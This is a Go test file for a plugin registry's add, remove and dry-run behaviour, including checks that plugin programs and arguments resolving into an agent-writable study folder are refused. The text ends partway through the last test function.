package registrar

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"reflect"
	"slices"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/mordor-forge/lamplight/v2/internal/pluginregistry"
	"github.com/mordor-forge/lamplight/v2/internal/pluginregistry/internal/regtest"
)

type Plugin = pluginregistry.Plugin

// envOf is the registry's view of a run of study on c, started in dir.
func envOf(c *regtest.Computer, dir string) pluginregistry.Env {
	return pluginregistry.Env{StudyHome: c.StudyHome(), Dir: dir, Getenv: c.Getenv}
}

// at is a run of study on c started in its home folder.
func at(c *regtest.Computer) pluginregistry.Env { return envOf(c, c.Home) }

func names(t *testing.T, c *regtest.Computer) []string {
	t.Helper()
	list, err := pluginregistry.Read(context.Background(), at(c))
	if err != nil {
		t.Fatalf("Read: %v", err)
	}
	out := []string{}
	for _, p := range list.Plugins {
		out = append(out, p.Name)
	}
	return out
}

// registryFor is a registry in this version's format with the entries given
// as JSON.
func registryFor(entries string) string {
	return `{"format": 1, "plugins": [` + entries + `]}`
}

// carriesControl reports whether an error would put a control character on a
// terminal.
func carriesControl(err error) bool {
	return err != nil && strings.ContainsFunc(err.Error(), func(r rune) bool { return r < ' ' || r == 0x7f || r == 0x202e || r == 0x200e })
}

func TestAddRegistersACommandByItsAbsolutePath(t *testing.T) {
	ctx := context.Background()
	c := regtest.New(t)
	shelf := regtest.Program(t, filepath.Join(c.Bin, "study-shelf"))

	// Nothing is registered, and asking makes nothing.
	list, err := pluginregistry.Read(ctx, at(c))
	if err != nil || list.Registry != c.Registry() || list.Plugins == nil || len(list.Plugins) != 0 {
		t.Fatalf("Read on a new computer = %+v, %v", list, err)
	}
	if regtest.Exists(c.ConfigDir()) {
		t.Fatal("listing created the configuration folder")
	}

	// A bare name is found on PATH; the arguments are kept as given, an
	// empty one too.
	got, err := Add(ctx, at(c), Spec{Name: "shelf", Command: []string{"study-shelf", "--recipe", "embedding gemma", ""}})
	if err != nil {
		t.Fatalf("Add: %v", err)
	}
	want := Registration{Registry: c.Registry(), Changed: true,
		Plugin: Plugin{Name: "shelf", Command: []string{shelf, "--recipe", "embedding gemma", ""}}}
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("Add = %+v, want %+v", got, want)
	}
	wantFile := fmt.Sprintf(`{
  "format": 1,
  "plugins": [
    {
      "name": "shelf",
      "command": [
        %q,
        "--recipe",
        "embedding gemma",
        ""
      ]
    }
  ]
}
`, shelf)
	if text := regtest.Text(t, c.Registry()); text != wantFile {
		t.Errorf("the registry:\n%s\nwant:\n%s", text, wantFile)
	}
	// The registry and a folder made for it are the learner's alone to read.
	for _, path := range []string{c.Registry(), c.ConfigDir(), filepath.Dir(c.ConfigDir())} {
		if info, err := os.Stat(path); err != nil || info.Mode().Perm()&0o077 != 0 {
			t.Errorf("%s: mode %v, %v; want nothing for group and others", path, info.Mode(), err)
		}
	}

	// A URL is registered as cleaned, and the listing is ordered by name.
	added, err := Add(ctx, at(c), Spec{Name: "remote", URL: " HTTP://LocalHost:8765/mcp?key=a&b=<c> "})
	if err != nil || !added.Changed || added.Plugin.URL != "http://localhost:8765/mcp?key=a&b=<c>" || added.Plugin.Command != nil {
		t.Fatalf("Add with a URL = %+v, %v", added, err)
	}
	if !strings.Contains(regtest.Text(t, c.Registry()), `"url": "http://localhost:8765/mcp?key=a&b=<c>"`) {
		t.Errorf("the registry does not hold the URL as it is:\n%s", regtest.Text(t, c.Registry()))
	}
	list, err = pluginregistry.Read(ctx, at(c))
	wantList := pluginregistry.List{Registry: c.Registry(), Plugins: []Plugin{added.Plugin, got.Plugin}}
	if err != nil || !reflect.DeepEqual(list, wantList) {
		t.Errorf("Read = %+v, %v; want %+v", list, err, wantList)
	}

	// The registry is this computer's: nothing of it is in the Study home.
	if left, err := os.ReadDir(c.Study); err != nil || len(left) != 0 {
		t.Errorf("registering wrote into the Study home: %v, %v", left, err)
	}
}

func TestAddRefusals(t *testing.T) {
	ctx := context.Background()
	c := regtest.New(t)
	shelf := regtest.Program(t, filepath.Join(c.Bin, "study-shelf"))
	plain := filepath.Join(c.Home, "notes.txt")
	regtest.WriteFile(t, plain, "notes")
	manyArgs := append([]string{shelf}, slices.Repeat([]string{"x"}, 101)...)

	for _, tc := range []struct {
		name string
		spec Spec
		code string
		want string
	}{
		{"no name", Spec{Command: []string{shelf}}, "invalid_argument", "name the Knowledge base plugin"},
		{"a name with a capital", Spec{Name: "Shelf", Command: []string{shelf}}, "invalid_argument", "not a valid name"},
		{"a name with a path", Spec{Name: "../kb", Command: []string{shelf}}, "invalid_argument", "not a valid name"},
		{"a name too long", Spec{Name: strings.Repeat("a", 65), Command: []string{shelf}}, "invalid_argument", "up to 64 characters"},
		{"the kind none as a name", Spec{Name: "none", Command: []string{shelf}}, "invalid_argument", "kind of Knowledge base"},
		{"the kind plugin as a name", Spec{Name: "plugin", URL: "http://localhost:1/"}, "invalid_argument", "kind of Knowledge base"},

		{"neither a command nor a URL", Spec{Name: "kb"}, "invalid_argument", "the command that starts it, or the URL"},
		{"both a command and a URL", Spec{Name: "kb", Command: []string{shelf}, URL: "http://localhost:1/"}, "invalid_argument", "not both"},
		{"an empty program", Spec{Name: "kb", Command: []string{"", "serve"}}, "invalid_argument", "the command is empty"},
		{"a program that is not on PATH", Spec{Name: "kb", Command: []string{"study-shelf-nightly"}}, "not_found", "PATH"},
		{"a program that is not there", Spec{Name: "kb", Command: []string{filepath.Join(c.Bin, "gone")}}, "not_found", "no program at"},
		{"a folder", Spec{Name: "kb", Command: []string{c.Bin}}, "invalid_argument", "a folder, not a program"},
		{"a file that cannot be run", Spec{Name: "kb", Command: []string{plain}}, "invalid_argument", "not a program you can run"},
		{"a program by a path with ..", Spec{Name: "kb", Command: []string{c.Home + "/tools/../bin/study-shelf"}}, "invalid_argument", "has .. in it"},

		{"an argument that is not text", Spec{Name: "kb", Command: []string{shelf, "\xff"}}, "invalid_argument", "argument 1 of the command is not valid UTF-8"},
		{"an argument with a line break", Spec{Name: "kb", Command: []string{shelf, "ok", "a\nb"}}, "invalid_argument", "argument 2 of the command contains a control character"},
		{"an argument that reorders text", Spec{Name: "kb", Command: []string{shelf, "a\u202eb"}}, "invalid_argument", "bidirectional control character"},
		{"an argument with a left-to-right mark", Spec{Name: "kb", Command: []string{shelf, "a\u200eb"}}, "invalid_argument", "bidirectional control character"},
		{"an argument too long", Spec{Name: "kb", Command: []string{shelf, strings.Repeat("a", 4097)}}, "invalid_argument", "longer than 4096"},
		{"too many arguments", Spec{Name: "kb", Command: manyArgs}, "invalid_argument", "more than 100 arguments"},

		{"a URL that is not http", Spec{Name: "kb", URL: "ftp://localhost/kb"}, "invalid_argument", "http or https"},
		{"a URL with a password", Spec{Name: "kb", URL: "http://ada:secret@localhost/mcp"}, "invalid_argument", "user name or password"},
		{"a URL with a fragment", Spec{Name: "kb", URL: "http://localhost/mcp#top"}, "invalid_argument", "#fragment"},
		{"a URL with port 0", Spec{Name: "kb", URL: "http://localhost:0/mcp"}, "invalid_argument", "port from 1 to 65535"},
		{"a URL with a port too high", Spec{Name: "kb", URL: "http://localhost:65536/mcp"}, "invalid_argument", "port from 1 to 65535"},
		{"a URL that allows arguments", Spec{Name: "kb", URL: "http://localhost/mcp", AllowStudyHomeArguments: true}, "invalid_argument", "goes with a command"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			var said []string
			for _, dryRun := range []bool{true, false} {
				tc.spec.DryRun = dryRun
				_, err := Add(ctx, at(c), tc.spec)
				if pluginregistry.CodeOf(err) != tc.code || !strings.Contains(err.Error(), tc.want) {
					t.Fatalf("dry run %v: %v (%s); want %s with %q", dryRun, err, pluginregistry.CodeOf(err), tc.code, tc.want)
				}
				if carriesControl(err) || strings.Contains(err.Error(), "secret") {
					t.Errorf("the error carries what it should not: %q", err.Error())
				}
				said = append(said, err.Error())
			}
			if said[0] != said[1] {
				t.Errorf("the dry run said %q, the real run %q", said[0], said[1])
			}
			if regtest.Exists(c.ConfigDir()) {
				t.Error("a refused registration made the configuration folder")
			}
		})
	}

	// The longest name, and the most arguments, are accepted.
	if _, err := Add(ctx, at(c), Spec{Name: strings.Repeat("a", 64), Command: manyArgs[:101]}); err != nil {
		t.Errorf("64 characters and 100 arguments: %v", err)
	}
}

// A file with an execute bit that is not for the learner, on a file they
// own, is no program they can run, and is not registered as one.
func TestAddRefusesAProgramTheLearnerMayNotRun(t *testing.T) {
	if os.Geteuid() == 0 {
		t.Skip("root may run any file with an execute bit, whoever the bit is for")
	}
	ctx := context.Background()
	c := regtest.New(t)
	forOthers := regtest.Program(t, filepath.Join(c.Bin, "kb"))
	if err := os.Chmod(forOthers, 0o001); err != nil {
		t.Fatal(err)
	}
	for _, program := range []string{forOthers, "kb"} {
		for _, dryRun := range []bool{true, false} {
			_, err := Add(ctx, at(c), Spec{Name: "kb", Command: []string{program}, DryRun: dryRun})
			want, text := "invalid_argument", "not a program you can run"
			if program == "kb" {
				// On PATH it is passed over, as a shell passes it over.
				want, text = "not_found", "PATH"
			}
			if pluginregistry.CodeOf(err) != want || !strings.Contains(err.Error(), text) {
				t.Errorf("Add of %s (dry run %v) = %v; want %s with %q", program, dryRun, err, want, text)
			}
		}
	}
	if regtest.Exists(c.ConfigDir()) {
		t.Error("a refused registration made the configuration folder")
	}
	// Once it is theirs to run, it is registered.
	if err := os.Chmod(forOthers, 0o100); err != nil {
		t.Fatal(err)
	}
	if _, err := Add(ctx, at(c), Spec{Name: "kb", Command: []string{"kb"}}); err != nil {
		t.Errorf("Add of a program the learner may run: %v", err)
	}
}

// A program is refused when its path leads through the Study home at any
// hop. The full list of ways is with the walk that decides it; these are
// the ones a learner, or an agent asking a learner, would try.
func TestAddRefusesAProgramThroughTheStudyHome(t *testing.T) {
	ctx := context.Background()
	c := regtest.New(t)
	topic := regtest.Mkdir(t, filepath.Join(c.Study, "go-concurrency"))
	inside := regtest.Program(t, filepath.Join(topic, "tools", "kb"))
	outside := regtest.Program(t, filepath.Join(c.Home, "opt", "kb"))
	linkOut := regtest.Symlink(t, inside, filepath.Join(c.Bin, "kb-link"))
	// A link outside to a link in the Study home to a program outside: the
	// first hop and the last are outside, and the one between is the
	// agent's to repoint.
	hop := regtest.Symlink(t, outside, filepath.Join(topic, "hop"))
	through := regtest.Symlink(t, hop, filepath.Join(c.Bin, "kb-through"))

	for name, program := range map[string]string{
		"by its path":                              inside,
		"through a link into the Study home":       linkOut,
		"through a link that passes through it":    through,
		"through that link, found on PATH":         "kb-through",
		"a link in the Study home, named directly": hop,
	} {
		for _, dryRun := range []bool{true, false} {
			_, err := Add(ctx, at(c), Spec{Name: "kb", Command: []string{program}, DryRun: dryRun})
			if pluginregistry.CodeOf(err) != "invalid_argument" || !strings.Contains(err.Error(), "inside the Study home") {
				t.Errorf("%s (dry run %v): %v; want invalid_argument, inside the Study home", name, dryRun, err)
			}
		}
	}
	if regtest.Exists(c.ConfigDir()) {
		t.Error("a refused registration made the configuration folder")
	}

	// The program itself is registered from where the agent cannot write.
	if _, err := Add(ctx, at(c), Spec{Name: "kb", Command: []string{outside}}); err != nil {
		t.Fatalf("a program outside the Study home: %v", err)
	}
	// Registered by a link outside, it is flagged once the link leads
	// through the Study home: the listing checks again each time.
	current := regtest.Symlink(t, outside, filepath.Join(c.Home, "current"))
	if _, err := Add(ctx, at(c), Spec{Name: "current", Command: []string{current}}); err != nil {
		t.Fatal(err)
	}
	if err := os.Remove(current); err != nil {
		t.Fatal(err)
	}
	regtest.Symlink(t, hop, current)
	list, err := pluginregistry.Read(ctx, at(c))
	if err != nil || len(list.Plugins) != 2 {
		t.Fatalf("Read = %+v, %v", list, err)
	}
	if p := list.Plugins[0]; p.Name != "current" || !strings.Contains(p.Problem, "its program is inside the Study home") ||
		!strings.Contains(p.Problem, "study knowledge-base add current --replace") {
		t.Errorf("the plugin whose link now leads through the Study home = %+v; want a problem", p)
	}
	if p := list.Plugins[1]; p.Name != "kb" || p.Problem != "" {
		t.Errorf("the plugin outside = %+v; want no problem", p)
	}
	if file, err := pluginregistry.OpenProgram(at(c), list.Plugins[0]); err == nil || file != nil {
		t.Errorf("OpenProgram of the flagged plugin = %v, %v; want it refused", file, err)
	}
	file, err := pluginregistry.OpenProgram(at(c), list.Plugins[1])
	if err != nil {
		t.Fatalf("OpenProgram: %v", err)
	}
	file.Close()
}

// An argument that names something in the Study home is refused unless the
// learner allows it, and the registry records that they did.
func TestAddArgumentsInsideTheStudyHome(t *testing.T) {
	ctx := context.Background()
	c := regtest.New(t)
	python := regtest.Program(t, filepath.Join(c.Bin, "python3"))
	script := regtest.Program(t, filepath.Join(c.Study, "topic", "kb.py"))
	notes := regtest.Mkdir(t, filepath.Join(c.Home, "notes"))

	for name, args := range map[string][]string{
		"a script in a Topic":         {script},
		"after the = of an option":    {"-u", "--script=" + script},
		"after the = of a setting":    {"CONF=" + script},
		"the Study home itself":       {"--allow", c.Study},
		"something not there yet":     {filepath.Join(c.Study, "index.db")},
		"through a link outside":      {regtest.Symlink(t, script, filepath.Join(c.Home, "linked.py"))},
		"into it and out again by ..": {c.Study + "/../home/notes"},
	} {
		var said []string
		for _, dryRun := range []bool{true, false} {
			_, err := Add(ctx, at(c), Spec{Name: "kb", Command: append([]string{python}, args...), DryRun: dryRun})
			if pluginregistry.CodeOf(err) != "invalid_argument" || !strings.Contains(err.Error(), "names something inside the Study home") ||
				!strings.Contains(err.Error(), "--allow-study-home-arguments") {
				t.Fatalf("%s (dry run %v): %v; want invalid_argument naming --allow-study-home-arguments", name, dryRun, err)
			}
			said = append(said, err.Error())
		}
		if said[0] != said[1] {
			t.Errorf("%s: the dry run said %q, the real run %q", name, said[0], said[1])
		}
	}
	if regtest.Exists(c.ConfigDir()) {
		t.Fatal("a refused registration made the configuration folder")
	}

	// Allowed, it is registered, and the registry says it was allowed.
	spec := Spec{Name: "kb", Command: []string{python, "-u", script}, AllowStudyHomeArguments: true}
	got, err := Add(ctx, at(c), spec)
	want := Plugin{Name: "kb", Command: []string{python, "-u", script}, AllowStudyHomeArguments: true}
	if err != nil || !got.Changed || !reflect.DeepEqual(got.Plugin, want) {
		t.Fatalf("Add, allowed = %+v, %v; want %+v", got, err, want)
	}
	if !strings.Contains(regtest.Text(t, c.Registry()), `"allow_study_home_arguments": true`) {
		t.Errorf("the registry does not say the arguments were allowed:\n%s", regtest.Text(t, c.Registry()))
	}
	list, err := pluginregistry.Read(ctx, at(c))
	if err != nil || len(list.Plugins) != 1 || !reflect.DeepEqual(list.Plugins[0], want) {
		t.Errorf("Read = %+v, %v; want the plugin, allowed and without a problem", list, err)
	}
	// The same again changes nothing; without the flag it is refused as at
	// first, since the argument is still there.
	if again, err := Add(ctx, at(c), spec); err != nil || again.Changed {
		t.Errorf("the same registration again = %+v, %v", again, err)
	}
	spec.AllowStudyHomeArguments = false
	if _, err := Add(ctx, at(c), spec); pluginregistry.CodeOf(err) != "invalid_argument" {
		t.Errorf("the same without the flag = %v; want invalid_argument", err)
	}

	// The flag where nothing needs it records nothing.
	plain, err := Add(ctx, at(c), Spec{Name: "notes", Command: []string{python, notes}, AllowStudyHomeArguments: true})
	if err != nil || plain.Plugin.AllowStudyHomeArguments {
		t.Errorf("the flag without an argument to allow = %+v, %v; want nothing recorded", plain, err)
	}

	// Registered while the Study home was elsewhere, an argument can be
	// inside the Study home study uses now. The listing says so, and the
	// way out is to register it again.
	moved := c.With(map[string]string{"STUDY_HOME": c.Home})
	list, err = pluginregistry.Read(ctx, at(moved))
	if err == nil {
		t.Fatalf("Read with the configuration folder in the Study home = %+v", list)
	}
	moved = c.With(map[string]string{"STUDY_HOME": notes})
	list, err = pluginregistry.Read(ctx, at(moved))
	if err != nil || len(list.Plugins) != 2 {
		t.Fatalf("Read = %+v, %v", list, err)
	}
	if kb := list.Plugins[0]; kb.Name != "kb" || kb.Problem != "" {
		t.Errorf("the plugin whose argument is outside this Study home = %+v", kb)
	}
	problem := list.Plugins[1].Problem
	if !strings.Contains(problem, "argument 1 of its command") || !strings.Contains(problem, "inside the Study home") ||
		!strings.Contains(problem, "--allow-study-home-arguments") || !strings.Contains(problem, "study knowledge-base add notes --replace") {
		t.Errorf("the problem of an argument inside the Study home = %q", problem)
	}
	if file, err := pluginregistry.OpenProgram(at(moved), list.Plugins[1]); pluginregistry.CodeOf(err) != "failed_precondition" || file != nil {
		t.Errorf("OpenProgram of the flagged plugin = %v, %v; want failed_precondition", file, err)
	}
	// Allowing it is a change to what is registered, so it needs --replace.
	respec := Spec{Name: "notes", Command: []string{python, notes}, AllowStudyHomeArguments: true}
	if _, err := Add(ctx, at(moved), respec); pluginregistry.CodeOf(err) != "already_exists" {
		t.Errorf("allowing the argument without --replace = %v; want already_exists", err)
	}
	respec.Replace = true
	if replaced, err := Add(ctx, at(moved), respec); err != nil || !replaced.Changed || !replaced.Plugin.AllowStudyHomeArguments ||
		replaced.Replaced == nil || replaced.Replaced.AllowStudyHomeArguments {
		t.Errorf("allowing the argument with --replace = %+v, %v", replaced, err)
	}
	if list, err = pluginregistry.Read(ctx, at(moved)); err != nil || list.Plugins[1].Problem != "" {
		t.Errorf("Read after allowing it = %+v, %v; want no problem", list, err)
	}
}

// A plugin is started from the registry's folder, so a file named relative
// to where its command was typed would not be found.
func TestAddRefusesAnArgumentRelativeToWhereItWasTyped(t *testing.T) {
	ctx := context.Background()
	c := regtest.New(t)
	shelf := regtest.Program(t, filepath.Join(c.Bin, "study-shelf"))
	started := regtest.Mkdir(t, filepath.Join(c.Home, "started"))
	regtest.WriteFile(t, filepath.Join(started, "kb.toml"), "x")
	regtest.Mkdir(t, filepath.Join(started, "build"))

	for _, args := range [][]string{{"--config", "kb.toml"}, {"--config=kb.toml"}, {"./kb.toml"}, {"./build"}} {
		for _, allow := range []bool{false, true} {
			_, err := Add(ctx, envOf(c, started), Spec{Name: "kb", Command: append([]string{shelf}, args...), AllowStudyHomeArguments: allow, DryRun: true})
			if pluginregistry.CodeOf(err) != "invalid_argument" || !strings.Contains(err.Error(), "started from the registry's folder") ||
				!strings.Contains(err.Error(), "full path") || !strings.Contains(err.Error(), started) {
				t.Errorf("Add with %q (allowed %v) = %v; want invalid_argument with advice to give the full path", args, allow, err)
			}
		}
	}
	// The full path, a word that only a folder is named like, and the same
	// words typed from elsewhere, are taken.
	for _, tc := range []struct {
		dir  string
		args []string
	}{
		{started, []string{"--config", filepath.Join(started, "kb.toml")}},
		{started, []string{"build", "--stdio"}},
		{c.Home, []string{"--config", "kb.toml"}},
	} {
		if _, err := Add(ctx, envOf(c, tc.dir), Spec{Name: "kb", Command: append([]string{shelf}, tc.args...), DryRun: true}); err != nil {
			t.Errorf("Add with %q from %s: %v", tc.args, tc.dir, err)
		}
	}
}

func TestAddWhenTheNameIsRegistered(t *testing.T) {
	ctx := context.Background()
	c := regtest.New(t)
	shelf := regtest.Program(t, filepath.Join(c.Bin, "study-shelf"))
	other := regtest.Program(t, filepath.Join(c.Bin, "other-kb"))
	first, err := Add(ctx, at(c), Spec{Name: "shelf", Command: []string{"study-shelf", "--recipe", "gemma"}})
	if err != nil {
		t.Fatal(err)
	}
	before := regtest.Snapshot(t, c.ConfigDir())
	unwritten := func(what string) {
		t.Helper()
		if regtest.Snapshot(t, c.ConfigDir()) != before {
			t.Errorf("%s wrote in the configuration folder", what)
		}
	}

	// The same registration again changes nothing, with --replace or not.
	for _, replace := range []bool{false, true} {
		again, err := Add(ctx, at(c), Spec{Name: "shelf", Command: []string{shelf, "--recipe", "gemma"}, Replace: replace})
		if err != nil || again.Changed || again.Replaced != nil || !reflect.DeepEqual(again.Plugin, first.Plugin) {
			t.Errorf("the same registration again (replace %v) = %+v, %v; want unchanged", replace, again, err)
		}
		unwritten("registering a plugin as it is registered")
	}

	// Another command, other arguments or a URL under the name is refused.
	for _, spec := range []Spec{
		{Name: "shelf", Command: []string{other}},
		{Name: "shelf", Command: []string{shelf, "--recipe", "other"}},
		{Name: "shelf", Command: []string{shelf}},
		{Name: "shelf", URL: "http://localhost:8765/mcp"},
	} {
		for _, dryRun := range []bool{true, false} {
			spec.DryRun = dryRun
			_, err := Add(ctx, at(c), spec)
			if pluginregistry.CodeOf(err) != "already_exists" || !strings.Contains(err.Error(), "--replace") {
				t.Errorf("Add(%+v) = %v; want already_exists naming --replace", spec, err)
			}
		}
		unwritten("a refused registration")
	}

	// With Replace, the name stands for the new one, and the result says
	// what it stood for. The dry run says the same and writes nothing.
	spec := Spec{Name: "shelf", URL: "http://localhost:8765/mcp", Replace: true, DryRun: true}
	want := Registration{Plugin: Plugin{Name: "shelf", URL: "http://localhost:8765/mcp"}, Registry: c.Registry(),
		Replaced: &first.Plugin, Changed: true, DryRun: true}
	dry, err := Add(ctx, at(c), spec)
	if err != nil || !reflect.DeepEqual(dry, want) {
		t.Errorf("dry run of a replacement = %+v, %v; want %+v", dry, err, want)
	}
	unwritten("a dry run")
	spec.DryRun, want.DryRun = false, false
	replaced, err := Add(ctx, at(c), spec)
	if err != nil || !reflect.DeepEqual(replaced, want) {
		t.Errorf("replacement = %+v, %v; want %+v", replaced, err, want)
	}
	list, err := pluginregistry.Read(ctx, at(c))
	if err != nil || !reflect.DeepEqual(list.Plugins, []Plugin{want.Plugin}) {
		t.Errorf("Read after the replacement = %+v, %v", list, err)
	}
}

func TestRemove(t *testing.T) {
	ctx := context.Background()
	c := regtest.New(t)
	shelf := regtest.Program(t, filepath.Join(c.Bin, "study-shelf"))

	// Nothing is registered: there is nothing to remove, and nothing is made.
	for _, dryRun := range []bool{true, false} {
		if _, err := Remove(ctx, at(c), "shelf", dryRun); pluginregistry.CodeOf(err) != "not_found" || !strings.Contains(err.Error(), "study knowledge-base list") {
			t.Errorf("removing from an empty registry (dry run %v) = %v; want not_found", dryRun, err)
		}
	}
	if regtest.Exists(c.ConfigDir()) {
		t.Fatal("removing nothing made the configuration folder")
	}
	for _, name := range []string{"", "Shelf", "../shelf", "none"} {
		if _, err := Remove(ctx, at(c), name, false); pluginregistry.CodeOf(err) != "invalid_argument" {
			t.Errorf("Remove(%q) = %v; want invalid_argument", name, err)
		}
	}

	for _, spec := range []Spec{
		{Name: "shelf", Command: []string{shelf, "serve"}},
		{Name: "remote", URL: "https://kb.example/mcp"},
	} {
		if _, err := Add(ctx, at(c), spec); err != nil {
			t.Fatal(err)
		}
	}
	before := regtest.Text(t, c.Registry())
	want := Removal{Plugin: Plugin{Name: "shelf", Command: []string{shelf, "serve"}}, Registry: c.Registry(), DryRun: true}
	dry, err := Remove(ctx, at(c), "shelf", true)
	if err != nil || !reflect.DeepEqual(dry, want) {
		t.Fatalf("dry run = %+v, %v; want %+v", dry, err, want)
	}
	if regtest.Text(t, c.Registry()) != before {
		t.Fatal("the dry run changed the registry")
	}
	want.DryRun = false
	removed, err := Remove(ctx, at(c), "shelf", false)
	if err != nil || !reflect.DeepEqual(removed, want) {
		t.Fatalf("Remove = %+v, %v; want %+v", removed, err, want)
	}
	if got := names(t, c); !slices.Equal(got, []string{"remote"}) {
		t.Errorf("registered after the removal: %v", got)
	}
	if _, err := Remove(ctx, at(c), "shelf", false); pluginregistry.CodeOf(err) != "not_found" {
		t.Errorf("removing it again = %v; want not_found", err)
	}

	// The last one out leaves an empty registry, still one this version reads.
	if _, err := Remove(ctx, at(c), "remote", false); err != nil {
		t.Fatal(err)
	}
	if text := regtest.Text(t, c.Registry()); text != "{\n  \"format\": 1,\n  \"plugins\": []\n}\n" {
		t.Errorf("the empty registry:\n%s", text)
	}
	if got := names(t, c); len(got) != 0 {
		t.Errorf("registered after removing all: %v", got)
	}
	if left, err := os.ReadDir(c.Study); err != nil || len(left) != 0 {
		t.Errorf("removing wrote into the Study home: %v, %v", left, err)
	}
}

// A dry run reports what the real run then does, and makes nothing: no
// registry, no lock file and no configuration folder.
func TestDryRunsReportWhatTheRealRunDoes(t *testing.T) {
	ctx := context.Background()
	c := regtest.New(t)
	regtest.Program(t, filepath.Join(c.Bin, "study-shelf"))

	spec := Spec{Name: "shelf", Command: []string{"study-shelf", "serve"}, DryRun: true}
	dry, err := Add(ctx, at(c), spec)
	if err != nil || !dry.DryRun || !dry.Changed {
		t.Fatalf("dry run = %+v, %v", dry, err)
	}
	if regtest.Exists(filepath.Dir(c.ConfigDir())) {
		t.Fatal("the dry run made a folder")
	}
	spec.DryRun = false
	real, err := Add(ctx, at(c), spec)
	dry.DryRun = false
	if err != nil || !reflect.DeepEqual(real, dry) {
		t.Errorf("the real run = %+v, %v; the dry run said %+v", real, err, dry)
	}
	// Once it is registered, both say that nothing changes.
	for _, dryRun := range []bool{true, false} {
		spec.DryRun = dryRun
		again, err := Add(ctx, at(c), spec)
		if err != nil || again.Changed || again.DryRun != dryRun {
			t.Errorf("registered already (dry run %v) = %+v, %v", dryRun, again, err)
		}
	}
}

// What the real run cannot do on this computer, the dry run says it cannot,
// in the same words: it looks at everything the change needs, and makes
// nothing. Each is something the learner can put right, so each says how.
func TestADryRunFailsWhereTheRealRunWould(t *testing.T) {
	if os.Geteuid() == 0 {
		t.Skip("root may write anywhere, so nothing here is refused")
	}
	ctx := context.Background()
	lockName := regtest.LockName
	for _, tc := range []struct {
		name string
		// registered says whether a plugin is registered before the
		// computer is broken, so that there is a registry to change.
		registered bool
		breakIt    func(t *testing.T, c *regtest.Computer)
		want       string
	}{
		{"the lock is a folder", true, func(t *testing.T, c *regtest.Computer) {
			regtest.Mkdir(t, filepath.Join(c.ConfigDir(), lockName))
		}, "is not a regular file"},
		// Opened through such a link, the lock would make an empty registry.
		{"the lock is a link to the registry's own name", false, func(t *testing.T, c *regtest.Computer) {
			regtest.Symlink(t, regtest.FileName, filepath.Join(c.ConfigDir(), lockName))
		}, "follows no link"},
		{"the lock is a link to a file beside it", true, func(t *testing.T, c *regtest.Computer) {
			regtest.WriteFile(t, filepath.Join(c.ConfigDir(), "other"), "")
			regtest.Symlink(t, "other", filepath.Join(c.ConfigDir(), lockName))
		}, "follows no link"},
		{"the lock is a link out of the folder", true, func(t *testing.T, c *regtest.Computer) {
			regtest.WriteFile(t, filepath.Join(c.Home, "elsewhere.lock"), "")
			regtest.Symlink(t, filepath.Join(c.Home, "elsewhere.lock"), filepath.Join(c.ConfigDir(), lockName))
		}, "follows no link"},
		{"the lock is a link into the Study home", true, func(t *testing.T, c *regtest.Computer) {
			regtest.WriteFile(t, filepath.Join(c.Study, "topic", "lock"), "")
			regtest.Symlink(t, filepath.Join(c.Study, "topic", "lock"), filepath.Join(c.ConfigDir(), lockName))
		}, "follows no link"},
		{"the lock cannot be opened", true, func(t *testing.T, c *regtest.Computer) {
			lock := filepath.Join(c.ConfigDir(), lockName)
			regtest.WriteFile(t, lock, "")
			if err := os.Chmod(lock, 0); err != nil {
				t.Fatal(err)
			}
		}, "fix its permissions, or delete it"},
		{"the configuration folder cannot be written in", true, func(t *testing.T, c *regtest.Computer) {
			if err := os.Chmod(c.ConfigDir(), 0o500); err != nil {
				t.Fatal(err)
			}
			t.Cleanup(func() { _ = os.Chmod(c.ConfigDir(), 0o700) })
		}, "is not a folder you can write in"},
		{"the folder is not there and the one that would hold it cannot be written in", false, func(t *testing.T, c *regtest.Computer) {
			parent := regtest.Mkdir(t, filepath.Dir(c.ConfigDir()))
			if err := os.Remove(c.ConfigDir()); err != nil {
				t.Fatal(err)
			}
			if err := os.Chmod(parent, 0o500); err != nil {
				t.Fatal(err)
			}
			t.Cleanup(func() { _ = os.Chmod(parent, 0o700) })
		}, "study cannot make it"},
		{"the configuration folder is a link that leads nowhere", false, func(t *testing.T, c *regtest.Computer) {
			if err := os.Remove(c.ConfigDir()); err != nil {
				t.Fatal(err)
			}
			regtest.Symlink(t, filepath.Join(c.Home, "nowhere"), c.ConfigDir())
		}, "a symbolic link that leads to a folder that is not there"},
		{"the configuration folder is a file", false, func(t *testing.T, c *regtest.Computer) {
			if err := os.Remove(c.ConfigDir()); err != nil {
				t.Fatal(err)
			}
			regtest.WriteFile(t, c.ConfigDir(), "not a folder")
		}, "is not a folder"},
		{"the registry cannot be read", true, func(t *testing.T, c *regtest.Computer) {
			if err := os.Chmod(c.Registry(), 0); err != nil {
				t.Fatal(err)
			}
		}, "check that the file is yours to read"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			c := regtest.New(t)
			regtest.Program(t, filepath.Join(c.Bin, "study-shelf"))
			regtest.Mkdir(t, c.ConfigDir())
			if tc.registered {
				if _, err := Add(ctx, at(c), Spec{Name: "old", URL: "http://localhost:1/"}); err != nil {
					t.Fatal(err)
				}
				// The lock a change left is not what is being tested.
				if err := os.Remove(filepath.Join(c.ConfigDir(), lockName)); err != nil {
					t.Fatal(err)
				}
			}
			tc.breakIt(t, c)
			before := regtest.Snapshot(t, c.Base)

			changes := map[string]func(dryRun bool) error{
				"add": func(dryRun bool) error {
					_, err := Add(ctx, at(c), Spec{Name: "shelf", Command: []string{"study-shelf"}, DryRun: dryRun})
					return err
				},
			}
			if tc.registered {
				changes["remove"] = func(dryRun bool) error {
					_, err := Remove(ctx, at(c), "old", dryRun)
					return err
				}
				changes["replace"] = func(dryRun bool) error {
					_, err := Add(ctx, at(c), Spec{Name: "old", URL: "http://localhost:2/", Replace: true, DryRun: dryRun})
					return err
				}
			}
			for what, change := range changes {
				dry, real := change(true), change(false)
				if dry == nil || real == nil || dry.Error() != real.Error() {
					t.Errorf("%s: the dry run said %v, the real run %v", what, dry, real)
					continue
				}
				// Something to put right, said with how: never a bare
				// operating system error.
				if code := pluginregistry.CodeOf(real); code != "failed_precondition" || !strings.Contains(real.Error(), tc.want) {
					t.Errorf("%s: %v (%s); want failed_precondition with %q", what, real, code, tc.want)
				}
			}
			if regtest.Snapshot(t, c.Base) != before {
				t.Error("a change that could not be made made something")
			}
